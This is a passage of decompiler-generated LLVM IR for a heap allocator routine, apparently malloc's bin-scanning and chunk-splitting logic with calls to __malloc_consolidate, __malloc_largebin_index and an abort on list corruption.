dec_label_pc_12598:                               ; preds = %bb143
  %v2_12598 = icmp eq i32 %v2_12588, 0
  br i1 %v2_12598, label %dec_label_pc_125a0, label %dec_label_pc_12984

dec_label_pc_125a0:                               ; preds = %dec_label_pc_12598
  %v0_125a0 = call i32 @__malloc_consolidate()
  store i32 %v0_125a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12984

dec_label_pc_125a8:                               ; preds = %bb143
  %v0_125a8 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_125a8, %v2_12588
  br i1 %tmp204, label %dec_label_pc_125d0, label %dec_label_pc_125b0

dec_label_pc_125b0:                               ; preds = %dec_label_pc_125a8
  %v1_125b0 = add i32 %v4_12584, -4
  store i32 %v1_125b0, i32* %r1.global-to-local, align 4
  %v3_125b4 = udiv i32 %v0_125a8, 8
  store i32 %v3_125b4, i32* %r2.global-to-local, align 4
  %v4_125b8 = mul nuw i32 %v3_125b4, 4
  %v5_125b8 = add i32 %v4_125b8, %v1_125b0
  %v6_125b8 = inttoptr i32 %v5_125b8 to i32*
  %v7_125b8 = load i32, i32* %v6_125b8, align 4
  store i32 %v7_125b8, i32* %r0.global-to-local, align 4
  %v2_125bc = icmp eq i32 %v7_125b8, 0
  br i1 %v2_125bc, label %dec_label_pc_125d0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_125b0
  %v2_125c0 = add i32 %v7_125b8, 8
  %v3_125c0 = inttoptr i32 %v2_125c0 to i32*
  %v4_125c0 = load i32, i32* %v3_125c0, align 4
  store i32 %v4_125c0, i32* %r3.global-to-local, align 4
  store i32 %v2_125c0, i32* %r0.global-to-local, align 4
  store i32 %v2_125c0, i32* %r4.global-to-local, align 4
  store i32 %v4_125c0, i32* %v6_125b8, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125b0, %dec_label_pc_125a8
  %tmp205 = icmp ugt i32 %v0_125a8, 255
  br i1 %tmp205, label %dec_label_pc_12620, label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %dec_label_pc_125d0
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_125e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  %v3_125e4 = udiv i32 %v0_125a8, 8
  store i32 %v3_125e4, i32* @r7, align 4
  %v4_125e8 = mul nuw i32 %v3_125e4, 8
  %v5_125e8 = add i32 %v4_125e0, %v4_125e8
  store i32 %v5_125e8, i32* %r3.global-to-local, align 4
  %v1_125ec = add i32 %v5_125e8, 44
  store i32 %v1_125ec, i32* %ip.global-to-local, align 4
  %v1_125f0 = add i32 %v5_125e8, 56
  %v2_125f0 = inttoptr i32 %v1_125f0 to i32*
  %v3_125f0 = load i32, i32* %v2_125f0, align 4
  store i32 %v3_125f0, i32* %r0.global-to-local, align 4
  %v9_125f4 = icmp eq i32 %v3_125f0, %v1_125ec
  br i1 %v9_125f4, label %dec_label_pc_12780, label %dec_label_pc_125fc

dec_label_pc_125fc:                               ; preds = %dec_label_pc_125d8
  %v2_125fc = add i32 %v3_125f0, %v0_125a8
  store i32 %v2_125fc, i32* %r3.global-to-local, align 4
  %v1_12600 = add i32 %v2_125fc, 4
  %v2_12600 = inttoptr i32 %v1_12600 to i32*
  %v3_12600 = load i32, i32* %v2_12600, align 4
  store i32 %v3_12600, i32* %r2.global-to-local, align 4
  %v1_12604 = add i32 %v3_125f0, 12
  %v2_12604 = inttoptr i32 %v1_12604 to i32*
  %v3_12604 = load i32, i32* %v2_12604, align 4
  store i32 %v3_12604, i32* %r1.global-to-local, align 4
  %v1_12608 = or i32 %v3_12600, 1
  store i32 %v1_12608, i32* %r2.global-to-local, align 4
  %v1_1260c = add i32 %v3_125f0, 8
  store i32 %v1_1260c, i32* %r4.global-to-local, align 4
  store i32 %v1_12608, i32* %v2_12600, align 4
  %v0_12614 = load i32, i32* %ip.global-to-local, align 4
  %v1_12614 = load i32, i32* %r1.global-to-local, align 4
  %v2_12614 = add i32 %v1_12614, 8
  %v3_12614 = inttoptr i32 %v2_12614 to i32*
  store i32 %v0_12614, i32* %v3_12614, align 4
  %v0_12618 = load i32, i32* %r1.global-to-local, align 4
  %v1_12618 = load i32, i32* %ip.global-to-local, align 4
  %v2_12618 = add i32 %v1_12618, 12
  %v3_12618 = inttoptr i32 %v2_12618 to i32*
  store i32 %v0_12618, i32* %v3_12618, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_12620:                               ; preds = %dec_label_pc_125d0
  store i32 %v0_125a8, i32* %r0.global-to-local, align 4
  %v1_12624 = call i32 @__malloc_largebin_index(i32 %v0_125a8)
  store i32 %v1_12624, i32* %r0.global-to-local, align 4
  %v0_12628 = load i32, i32* @r4, align 4
  %v1_12628 = and i32 %v0_12628, 2
  %v2_12628 = icmp eq i32 %v1_12628, 0
  store i32 %v1_12624, i32* @r7, align 4
  br i1 %v2_12628, label %dec_label_pc_12780, label %dec_label_pc_12634

dec_label_pc_12634:                               ; preds = %dec_label_pc_12620
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r1.global-to-local, align 4
  %v4_1263c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_1263c, i32* @r0, align 4
  %v0_12640 = call i32 @__malloc_consolidate()
  store i32 %v0_12640, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12780

dec_label_pc_12648:                               ; preds = %dec_label_pc_12794
  %v1_12648 = add i32 %v3_12794, 4
  %v2_12648 = inttoptr i32 %v1_12648 to i32*
  %v3_12648 = load i32, i32* %v2_12648, align 4
  store i32 %v3_12648, i32* %r3.global-to-local, align 4
  %v0_1264c = load i32, i32* @sl, align 4
  %v1_12650 = and i32 %v3_12648, -4
  store i32 %v1_12650, i32* %r4.global-to-local, align 4
  %v1_12654 = add i32 %v3_12794, 12
  %v2_12654 = inttoptr i32 %v1_12654 to i32*
  %v3_12654 = load i32, i32* %v2_12654, align 4
  store i32 %v3_12654, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1264c, 255
  br i1 %tmp206, label %dec_label_pc_126b0, label %dec_label_pc_1265c

dec_label_pc_1265c:                               ; preds = %dec_label_pc_12648
  %v9_1265c = icmp eq i32 %v3_12654, %v0_126b4
  br i1 %v9_1265c, label %dec_label_pc_12664, label %dec_label_pc_126b0

dec_label_pc_12664:                               ; preds = %dec_label_pc_1265c
  %v0_12664 = load i32, i32* @sb, align 4
  %v1_12664 = add i32 %v0_12664, 48
  %v2_12664 = inttoptr i32 %v1_12664 to i32*
  %v3_12664 = load i32, i32* %v2_12664, align 4
  store i32 %v3_12664, i32* %r3.global-to-local, align 4
  %v9_12668 = icmp eq i32 %v3_12794, %v3_12664
  br i1 %v9_12668, label %dec_label_pc_12670, label %dec_label_pc_126b0

dec_label_pc_12670:                               ; preds = %dec_label_pc_12664
  %v1_12670 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_12650, %v1_12670
  br i1 %tmp207, label %dec_label_pc_12678, label %dec_label_pc_126b0

dec_label_pc_12678:                               ; preds = %dec_label_pc_12670
  %v2_12678 = sub i32 %v1_12650, %v0_1264c
  store i32 %v2_12678, i32* %r2.global-to-local, align 4
  %v2_1267c = add i32 %v0_1264c, %v3_12794
  store i32 %v2_1267c, i32* %r3.global-to-local, align 4
  %v1_12680 = or i32 %v0_1264c, 1
  store i32 %v1_12680, i32* %r0.global-to-local, align 4
  %v1_12684 = or i32 %v2_12678, 1
  store i32 %v1_12684, i32* %r1.global-to-local, align 4
  %v1_12688 = add i32 %v3_12794, 8
  store i32 %v1_12688, i32* %r4.global-to-local, align 4
  %v2_1268c = add i32 %v0_126b4, 8
  %v3_1268c = inttoptr i32 %v2_1268c to i32*
  store i32 %v2_1267c, i32* %v3_1268c, align 4
  %v0_12690 = load i32, i32* %r3.global-to-local, align 4
  %v1_12690 = load i32, i32* %ip.global-to-local, align 4
  %v2_12690 = add i32 %v1_12690, 12
  %v3_12690 = inttoptr i32 %v2_12690 to i32*
  store i32 %v0_12690, i32* %v3_12690, align 4
  %v0_12694 = load i32, i32* %r0.global-to-local, align 4
  %v1_12694 = load i32, i32* @r6, align 4
  %v2_12694 = add i32 %v1_12694, 4
  %v3_12694 = inttoptr i32 %v2_12694 to i32*
  store i32 %v0_12694, i32* %v3_12694, align 4
  %v0_12698 = load i32, i32* %r3.global-to-local, align 4
  %v1_12698 = load i32, i32* @sb, align 4
  %v2_12698 = add i32 %v1_12698, 48
  %v3_12698 = inttoptr i32 %v2_12698 to i32*
  store i32 %v0_12698, i32* %v3_12698, align 4
  %v0_1269c = load i32, i32* %r2.global-to-local, align 4
  %v1_1269c = load i32, i32* %r3.global-to-local, align 4
  %v3_1269c = add i32 %v1_1269c, %v0_1269c
  %v4_1269c = inttoptr i32 %v3_1269c to i32*
  store i32 %v0_1269c, i32* %v4_1269c, align 4
  %v0_126a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_126a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_126a0 = add i32 %v1_126a0, 4
  %v3_126a0 = inttoptr i32 %v2_126a0 to i32*
  store i32 %v0_126a0, i32* %v3_126a0, align 4
  %v0_126a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_126a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_126a4 = add i32 %v1_126a4, 12
  %v3_126a4 = inttoptr i32 %v2_126a4 to i32*
  store i32 %v0_126a4, i32* %v3_126a4, align 4
  %v0_126a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_126a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_126a8 = add i32 %v1_126a8, 8
  %v3_126a8 = inttoptr i32 %v2_126a8 to i32*
  store i32 %v0_126a8, i32* %v3_126a8, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_126b0:                               ; preds = %dec_label_pc_12670, %dec_label_pc_12664, %dec_label_pc_1265c, %dec_label_pc_12648
  %v9_126b0 = icmp eq i32 %v1_12650, %v0_1264c
  %v2_126b4 = add i32 %v3_12654, 8
  %v3_126b4 = inttoptr i32 %v2_126b4 to i32*
  store i32 %v0_126b4, i32* %v3_126b4, align 4
  %v0_126b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_126b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_126b8 = add i32 %v1_126b8, 12
  %v3_126b8 = inttoptr i32 %v2_126b8 to i32*
  store i32 %v0_126b8, i32* %v3_126b8, align 4
  br i1 %v9_126b0, label %dec_label_pc_12810.loopexit, label %dec_label_pc_126cc

dec_label_pc_126cc:                               ; preds = %dec_label_pc_126b0
  %v0_126cc = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_126cc, 255
  br i1 %tmp208, label %dec_label_pc_126f0, label %dec_label_pc_126d4

dec_label_pc_126d4:                               ; preds = %dec_label_pc_126cc
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v1_126d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_126d8 = add i32 %v1_126d8, ptrtoint (i32* @global_var_22204.365 to i32)
  %v3_126d8 = inttoptr i32 %v2_126d8 to i32*
  %v4_126d8 = load i32, i32* %v3_126d8, align 4
  %v3_126dc = udiv i32 %v0_126cc, 8
  store i32 %v3_126dc, i32* %r0.global-to-local, align 4
  %v4_126e0 = mul nuw i32 %v3_126dc, 8
  %v5_126e0 = add i32 %v4_126d8, %v4_126e0
  store i32 %v5_126e0, i32* %r3.global-to-local, align 4
  %v1_126e4 = add i32 %v5_126e0, 44
  store i32 %v1_126e4, i32* %ip.global-to-local, align 4
  %v1_126e8 = add i32 %v5_126e0, 52
  %v2_126e8 = inttoptr i32 %v1_126e8 to i32*
  %v3_126e8 = load i32, i32* %v2_126e8, align 4
  store i32 %v3_126e8, i32* @lr, align 4
  br label %dec_label_pc_12748

dec_label_pc_126f0:                               ; preds = %dec_label_pc_126cc
  store i32 %v0_126cc, i32* %r0.global-to-local, align 4
  %v1_126f4 = call i32 @__malloc_largebin_index(i32 %v0_126cc)
  store i32 %v1_126f4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %ip.global-to-local, align 4
  %v1_126fc = load i32, i32* %r8.global-to-local, align 4
  %v2_126fc = add i32 %v1_126fc, ptrtoint (i32* @global_var_22204.365 to i32)
  %v3_126fc = inttoptr i32 %v2_126fc to i32*
  %v4_126fc = load i32, i32* %v3_126fc, align 4
  %v4_12700 = mul i32 %v1_126f4, 8
  %v5_12700 = add i32 %v4_126fc, %v4_12700
  store i32 %v5_12700, i32* %r3.global-to-local, align 4
  %v1_12704 = add i32 %v5_12700, 44
  store i32 %v1_12704, i32* %ip.global-to-local, align 4
  %v1_12708 = add i32 %v5_12700, 52
  %v2_12708 = inttoptr i32 %v1_12708 to i32*
  %v3_12708 = load i32, i32* %v2_12708, align 4
  store i32 %v3_12708, i32* @lr, align 4
  %v9_1270c = icmp eq i32 %v3_12708, %v1_12704
  br i1 %v9_1270c, label %dec_label_pc_12748, label %dec_label_pc_12714

dec_label_pc_12714:                               ; preds = %dec_label_pc_126f0
  %v1_12714 = add i32 %v5_12700, 56
  %v2_12714 = inttoptr i32 %v1_12714 to i32*
  %v3_12714 = load i32, i32* %v2_12714, align 4
  store i32 %v3_12714, i32* %r1.global-to-local, align 4
  %v1_12718 = add i32 %v3_12714, 4
  %v2_12718 = inttoptr i32 %v1_12718 to i32*
  %v3_12718 = load i32, i32* %v2_12718, align 4
  store i32 %v3_12718, i32* %r3.global-to-local, align 4
  %v0_1271c = load i32, i32* %r4.global-to-local, align 4
  %v3_1271c = icmp ult i32 %v0_1271c, %v3_12718
  br i1 %v3_1271c, label %.thread, label %dec_label_pc_12738.preheader

.thread:                                          ; preds = %dec_label_pc_12714
  store i32 %v1_12704, i32* @lr, align 4
  store i32 %v3_12714, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12748

dec_label_pc_12738.preheader:                     ; preds = %dec_label_pc_12714
  %v2_12724 = or i32 %v0_1271c, 1
  store i32 %v2_12724, i32* %r2.global-to-local, align 4
  %v1_12738182 = add i32 %v3_12708, 4
  %v2_12738183 = inttoptr i32 %v1_12738182 to i32*
  %v3_12738184 = load i32, i32* %v2_12738183, align 4
  store i32 %v3_12738184, i32* %r3.global-to-local, align 4
  %v3_1273c186 = icmp ult i32 %v2_12724, %v3_12738184
  br i1 %v3_1273c186, label %dec_label_pc_12734, label %dec_label_pc_12744

dec_label_pc_12734:                               ; preds = %dec_label_pc_12738.preheader, %dec_label_pc_12734
  %v0_12744187 = phi i32 [ %v3_12734, %dec_label_pc_12734 ], [ %v3_12708, %dec_label_pc_12738.preheader ]
  %v1_12734 = add i32 %v0_12744187, 8
  %v2_12734 = inttoptr i32 %v1_12734 to i32*
  %v3_12734 = load i32, i32* %v2_12734, align 4
  store i32 %v3_12734, i32* @lr, align 4
  %v1_12738 = add i32 %v3_12734, 4
  %v2_12738 = inttoptr i32 %v1_12738 to i32*
  %v3_12738 = load i32, i32* %v2_12738, align 4
  store i32 %v3_12738, i32* %r3.global-to-local, align 4
  %v3_1273c = icmp ult i32 %v2_12724, %v3_12738
  br i1 %v3_1273c, label %dec_label_pc_12734, label %dec_label_pc_12744

dec_label_pc_12744:                               ; preds = %dec_label_pc_12734, %dec_label_pc_12738.preheader
  %v0_12744.lcssa = phi i32 [ %v3_12708, %dec_label_pc_12738.preheader ], [ %v3_12734, %dec_label_pc_12734 ]
  %v1_12744 = add i32 %v0_12744.lcssa, 12
  %v2_12744 = inttoptr i32 %v1_12744 to i32*
  %v3_12744 = load i32, i32* %v2_12744, align 4
  store i32 %v3_12744, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12748

dec_label_pc_12748:                               ; preds = %.thread, %dec_label_pc_126f0, %dec_label_pc_126d4, %dec_label_pc_12744
  %v0_12768 = phi i32 [ %v1_12704, %dec_label_pc_126f0 ], [ %v1_126e4, %dec_label_pc_126d4 ], [ %v3_12744, %dec_label_pc_12744 ], [ %v3_12714, %.thread ]
  %v0_1275c = phi i32 [ %v1_126f4, %dec_label_pc_126f0 ], [ %v3_126dc, %dec_label_pc_126d4 ], [ %v1_126f4, %dec_label_pc_12744 ], [ %v1_126f4, %.thread ]
  %v1_1274c = phi i32 [ %v1_126fc, %dec_label_pc_126f0 ], [ %v1_126d8, %dec_label_pc_126d4 ], [ %v1_126fc, %dec_label_pc_12744 ], [ %v1_126fc, %.thread ]
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v2_1274c = add i32 %v1_1274c, ptrtoint (i32* @global_var_22204.365 to i32)
  %v3_1274c = inttoptr i32 %v2_1274c to i32*
  %v4_1274c = load i32, i32* %v3_1274c, align 4
  %v3_12750 = sdiv i32 %v0_1275c, 32
  store i32 %v3_12750, i32* %r3.global-to-local, align 4
  %v4_12754 = mul nsw i32 %v3_12750, 4
  %v5_12754 = add i32 %v4_1274c, %v4_12754
  store i32 %v5_12754, i32* %r1.global-to-local, align 4
  %v1_12758 = add i32 %v5_12754, 820
  %v2_12758 = inttoptr i32 %v1_12758 to i32*
  %v3_12758 = load i32, i32* %v2_12758, align 4
  %v1_1275c = urem i32 %v0_1275c, 32
  store i32 %v1_1275c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_12764 = shl i32 1, %v1_1275c
  %v8_12764 = or i32 %v3_12758, %v7_12764
  store i32 %v8_12764, i32* %r3.global-to-local, align 4
  %v1_12768 = load i32, i32* @r6, align 4
  %v2_12768 = add i32 %v1_12768, 12
  %v3_12768 = inttoptr i32 %v2_12768 to i32*
  store i32 %v0_12768, i32* %v3_12768, align 4
  %v0_1276c = load i32, i32* @lr, align 4
  %v1_1276c = load i32, i32* @r6, align 4
  %v2_1276c = add i32 %v1_1276c, 8
  %v3_1276c = inttoptr i32 %v2_1276c to i32*
  store i32 %v0_1276c, i32* %v3_1276c, align 4
  %v0_12770 = load i32, i32* %r3.global-to-local, align 4
  %v1_12770 = load i32, i32* %r1.global-to-local, align 4
  %v2_12770 = add i32 %v1_12770, 820
  %v3_12770 = inttoptr i32 %v2_12770 to i32*
  store i32 %v0_12770, i32* %v3_12770, align 4
  %v0_12774 = load i32, i32* @r6, align 4
  %v1_12774 = load i32, i32* @lr, align 4
  %v2_12774 = add i32 %v1_12774, 12
  %v3_12774 = inttoptr i32 %v2_12774 to i32*
  store i32 %v0_12774, i32* %v3_12774, align 4
  %v0_12778 = load i32, i32* @r6, align 4
  %v1_12778 = load i32, i32* %ip.global-to-local, align 4
  %v2_12778 = add i32 %v1_12778, 8
  %v3_12778 = inttoptr i32 %v2_12778 to i32*
  store i32 %v0_12778, i32* %v3_12778, align 4
  %v0_12794.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12794

dec_label_pc_12780:                               ; preds = %dec_label_pc_12620, %dec_label_pc_125d8, %dec_label_pc_12634
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r1.global-to-local, align 4
  %v4_12788 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12788, i32* @sb, align 4
  %v0_1278c = load i32, i32* @sl, align 4
  %v1_1278c = add i32 %v0_1278c, 16
  store i32 %v1_1278c, i32* @fp, align 4
  %v1_12790 = add i32 %v4_12788, 52
  store i32 %v1_12790, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12748, %dec_label_pc_12780
  %v0_126b4 = phi i32 [ %v0_12794.pre, %dec_label_pc_12748 ], [ %v1_12790, %dec_label_pc_12780 ]
  %v1_12794 = add i32 %v0_126b4, 12
  %v2_12794 = inttoptr i32 %v1_12794 to i32*
  %v3_12794 = load i32, i32* %v2_12794, align 4
  store i32 %v3_12794, i32* @r6, align 4
  %v9_12798 = icmp eq i32 %v3_12794, %v0_126b4
  br i1 %v9_12798, label %dec_label_pc_127a0, label %dec_label_pc_12648

dec_label_pc_127a0:                               ; preds = %dec_label_pc_12794
  %v0_127a0 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_127a0, 256
  %v0_12858.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_127a0.dec_label_pc_12858_crit_edge, label %dec_label_pc_127a8

dec_label_pc_127a0.dec_label_pc_12858_crit_edge:  ; preds = %dec_label_pc_127a0
  %.pre203 = mul i32 %v0_12858.pre, 8
  br label %dec_label_pc_12858

dec_label_pc_127a8:                               ; preds = %dec_label_pc_127a0
  %v4_127a8 = mul i32 %v0_12858.pre, 8
  %v5_127a8 = add i32 %v4_127a8, %v0_126b4
  store i32 %v5_127a8, i32* %r3.global-to-local, align 4
  %v1_127ac = add i32 %v5_127a8, -8
  store i32 %v1_127ac, i32* %r1.global-to-local, align 4
  %v1_127b0 = add i32 %v5_127a8, 4
  %v2_127b0 = inttoptr i32 %v1_127b0 to i32*
  %storemerge.pre = load i32, i32* %v2_127b0, align 4
  br label %dec_label_pc_12850

dec_label_pc_127b8:                               ; preds = %dec_label_pc_12850
  %v1_127b8 = add i32 %v1_127e0, 4
  %v2_127b8 = inttoptr i32 %v1_127b8 to i32*
  %v3_127b8 = load i32, i32* %v2_127b8, align 4
  store i32 %v3_127b8, i32* %r3.global-to-local, align 4
  %v1_127bc = and i32 %v3_127b8, -4
  store i32 %v1_127bc, i32* %r2.global-to-local, align 4
  %v3_127c0 = icmp ult i32 %v1_127bc, %v0_127a0
  %v1_127c4 = add i32 %v1_127e0, 12
  %v2_127c4 = inttoptr i32 %v1_127c4 to i32*
  %v3_127c4 = load i32, i32* %v2_127c4, align 4
  store i32 %v3_127c4, i32* %r0.global-to-local, align 4
  br i1 %v3_127c0, label %dec_label_pc_12850, label %dec_label_pc_127cc

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127b8
  %v1_127cc = add i32 %v1_127e0, 8
  %v2_127cc = inttoptr i32 %v1_127cc to i32*
  %v3_127cc = load i32, i32* %v2_127cc, align 4
  store i32 %v3_127cc, i32* %r1.global-to-local, align 4
  %v1_127d0 = add i32 %v3_127cc, 12
  %v2_127d0 = inttoptr i32 %v1_127d0 to i32*
  %v3_127d0 = load i32, i32* %v2_127d0, align 4
  store i32 %v3_127d0, i32* %r3.global-to-local, align 4
  %v9_127d4 = icmp eq i32 %v3_127d0, %v1_127e0
  br i1 %v9_127d4, label %dec_label_pc_127dc, label %dec_label_pc_127e8

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127cc
  %v1_127dc = add i32 %v3_127c4, 8
  %v2_127dc = inttoptr i32 %v1_127dc to i32*
  %v3_127dc = load i32, i32* %v2_127dc, align 4
  store i32 %v3_127dc, i32* %r3.global-to-local, align 4
  %v9_127e0 = icmp eq i32 %v3_127dc, %v1_127e0
  br i1 %v9_127e0, label %dec_label_pc_127ec, label %dec_label_pc_127e8

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127cc, %dec_label_pc_127dc
  %v0_127e8 = call i32 @abort()
  store i32 %v0_127e8, i32* %r0.global-to-local, align 4
  %v0_127ec.pre = load i32, i32* @sl, align 4
  %v1_127ec.pre = load i32, i32* @r2, align 4
  %v0_127f4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_127ec

dec_label_pc_127ec:                               ; preds = %dec_label_pc_127dc, %dec_label_pc_127e8
  %v1_127f4 = phi i32 [ %v3_127c4, %dec_label_pc_127dc ], [ %v0_127e8, %dec_label_pc_127e8 ]
  %v0_127f4 = phi i32 [ %v3_127cc, %dec_label_pc_127dc ], [ %v0_127f4.pre, %dec_label_pc_127e8 ]
  %v1_127ec = phi i32 [ %v1_127bc, %dec_label_pc_127dc ], [ %v1_127ec.pre, %dec_label_pc_127e8 ]
  %v0_127ec = phi i32 [ %v0_127a0, %dec_label_pc_127dc ], [ %v0_127ec.pre, %dec_label_pc_127e8 ]
  %v2_127ec = sub i32 %v1_127ec, %v0_127ec
  store i32 %v2_127ec, i32* %lr.global-to-local, align 4
  %v2_127f4 = add i32 %v1_127f4, 8
  %v3_127f4 = inttoptr i32 %v2_127f4 to i32*
  store i32 %v0_127f4, i32* %v3_127f4, align 4
  %v0_127f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_127f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_127f8 = add i32 %v1_127f8, 12
  %v3_127f8 = inttoptr i32 %v2_127f8 to i32*
  store i32 %v0_127f8, i32* %v3_127f8, align 4
  %v0_127fc = load i32, i32* %ip.global-to-local, align 4
  %v1_127fc = add i32 %v0_127fc, 8
  store i32 %v1_127fc, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_127ec, 15
  br i1 %tmp210, label %dec_label_pc_1281c, label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %dec_label_pc_127ec
  %v1_12804 = load i32, i32* %r2.global-to-local, align 4
  %v2_12804 = add i32 %v1_12804, %v0_127fc
  store i32 %v2_12804, i32* %r2.global-to-local, align 4
  %v1_12808 = add i32 %v2_12804, 4
  %v2_12808 = inttoptr i32 %v1_12808 to i32*
  %v3_12808 = load i32, i32* %v2_12808, align 4
  store i32 %v3_12808, i32* %r3.global-to-local, align 4
  store i32 %v1_127fc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12810

dec_label_pc_12810.loopexit:                      ; preds = %dec_label_pc_126b0
  %v1_126bc = load i32, i32* @r6, align 4
  %v2_126bc = load i32, i32* @sl, align 4
  %v3_126bc = add i32 %v2_126bc, %v1_126bc
  store i32 %v3_126bc, i32* %r2.global-to-local, align 4
  %v2_126c0 = add i32 %v3_126bc, 4
  %v3_126c0 = inttoptr i32 %v2_126c0 to i32*
  %v4_126c0 = load i32, i32* %v3_126c0, align 4
  store i32 %v4_126c0, i32* %r3.global-to-local, align 4
  %v2_126c4 = add i32 %v1_126bc, 8
  store i32 %v2_126c4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %.dec_label_pc_12810_crit_edge, %dec_label_pc_12810.loopexit, %dec_label_pc_12804
  %v1_12814 = phi i32 [ %v4_12938, %.dec_label_pc_12810_crit_edge ], [ %v3_126bc, %dec_label_pc_12810.loopexit ], [ %v2_12804, %dec_label_pc_12804 ]
  %v0_12810 = phi i32 [ %v7_12938, %.dec_label_pc_12810_crit_edge ], [ %v4_126c0, %dec_label_pc_12810.loopexit ], [ %v3_12808, %dec_label_pc_12804 ]
  %v1_12810 = or i32 %v0_12810, 1
  store i32 %v1_12810, i32* %r3.global-to-local, align 4
  %v2_12814 = add i32 %v1_12814, 4
  %v3_12814 = inttoptr i32 %v2_12814 to i32*
  store i32 %v1_12810, i32* %v3_12814, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_1281c:                               ; preds = %dec_label_pc_127ec
  %v1_1281c = load i32, i32* @sl, align 4
  %v2_1281c = add i32 %v1_1281c, %v0_127fc
  store i32 %v2_1281c, i32* %r2.global-to-local, align 4
  %v1_12820 = or i32 %v1_1281c, 1
  store i32 %v1_12820, i32* %r3.global-to-local, align 4
  %v0_12824 = load i32, i32* %lr.global-to-local, align 4
  %v1_12824 = or i32 %v0_12824, 1
  store i32 %v1_12824, i32* %r1.global-to-local, align 4
  store i32 %v1_127fc, i32* %r4.global-to-local, align 4
  %v2_1282c = add i32 %v0_127fc, 4
  %v3_1282c = inttoptr i32 %v2_1282c to i32*
  store i32 %v1_12820, i32* %v3_1282c, align 4
  %v0_12830 = load i32, i32* %r2.global-to-local, align 4
  %v1_12830 = load i32, i32* @r6, align 4
  %v2_12830 = add i32 %v1_12830, 8
  %v3_12830 = inttoptr i32 %v2_12830 to i32*
  store i32 %v0_12830, i32* %v3_12830, align 4
  %v0_12834 = load i32, i32* %r2.global-to-local, align 4
  %v1_12834 = load i32, i32* @r6, align 4
  %v2_12834 = add i32 %v1_12834, 12
  %v3_12834 = inttoptr i32 %v2_12834 to i32*
  store i32 %v0_12834, i32* %v3_12834, align 4
  %v0_12838 = load i32, i32* %lr.global-to-local, align 4
  %v1_12838 = load i32, i32* %r2.global-to-local, align 4
  %v3_12838 = add i32 %v1_12838, %v0_12838
  %v4_12838 = inttoptr i32 %v3_12838 to i32*
  store i32 %v0_12838, i32* %v4_12838, align 4
  %v0_1283c = load i32, i32* %r1.global-to-local, align 4
  %v1_1283c = load i32, i32* %r2.global-to-local, align 4
  %v2_1283c = add i32 %v1_1283c, 4
  %v3_1283c = inttoptr i32 %v2_1283c to i32*
  store i32 %v0_1283c, i32* %v3_1283c, align 4
  %v0_12840 = load i32, i32* @r6, align 4
  %v1_12840 = load i32, i32* %r2.global-to-local, align 4
  %v2_12840 = add i32 %v1_12840, 12
  %v3_12840 = inttoptr i32 %v2_12840 to i32*
  store i32 %v0_12840, i32* %v3_12840, align 4
  %v0_12844 = load i32, i32* @r6, align 4
  %v1_12844 = load i32, i32* %r2.global-to-local, align 4
  %v2_12844 = add i32 %v1_12844, 8
  %v3_12844 = inttoptr i32 %v2_12844 to i32*
  store i32 %v0_12844, i32* %v3_12844, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_12850:                               ; preds = %dec_label_pc_127b8, %dec_label_pc_127a8
  %v1_127e0 = phi i32 [ %storemerge.pre, %dec_label_pc_127a8 ], [ %v3_127c4, %dec_label_pc_127b8 ]
